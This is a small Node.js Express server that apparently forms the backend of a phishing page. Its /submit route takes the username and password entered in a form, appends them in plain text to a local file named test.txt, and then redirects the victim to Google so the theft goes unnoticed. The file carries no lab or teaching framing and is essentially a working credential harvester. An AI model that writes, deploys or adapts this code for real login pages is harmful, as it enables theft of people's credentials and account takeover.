const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/submit', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    const data = `Username: ${username}, Password: ${password}\n`;

    // Append credentials to test.txt
    fs.appendFile(path.join(__dirname, 'test.txt'), data, (err) => {
        if (err) {
            console.error('Failed to save credentials', err);
            return res.status(500).send('Internal Server Error');
        }
        // Redirect to Google
        res.redirect('https://www.google.com');
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
